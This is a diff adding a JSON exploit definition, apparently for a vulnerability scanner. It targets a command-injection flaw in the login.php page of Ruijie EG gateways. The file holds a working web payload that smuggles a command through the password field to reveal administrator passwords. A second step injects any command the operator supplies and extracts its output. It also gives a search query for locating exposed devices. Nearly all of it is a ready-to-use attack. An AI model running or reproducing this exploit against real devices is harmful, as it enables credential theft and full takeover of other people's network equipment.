@@ -1,0 +1,97 @@
+{
+  "Name": "Ruijie EG login.php rce",
+  "Description": "Attackers can use sandbox commands to obtain administrator account passwords, log in to the system, execute commands, and control the entire device.",
+  "Product": "Ruijie-EG",
+  "Homepage": "http://www.ruijie.com.cn/",
+  "DisclosureDate": "2021-04-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Ruijie-EG\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "show+webmaster+user"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "username=admin&password=admin?show+webmaster+user",
+        "data_type": "text",
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        "follow_redirect": false,
+        "method": "POST",
+        "uri": "/login.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "\"data\":\"WORD",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "\"status\":1",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "username=admin&password=admin?{{{cmd}}}",
+        "data_type": "text",
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        "follow_redirect": false,
+        "method": "POST",
+        "uri": "/login.php"
+      },
+      "SetVariable": ["output|lastbody|regex|data\":\"(.*?)\","]
+    }
+  ],
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Ruijie-EG"]
+  }
+}
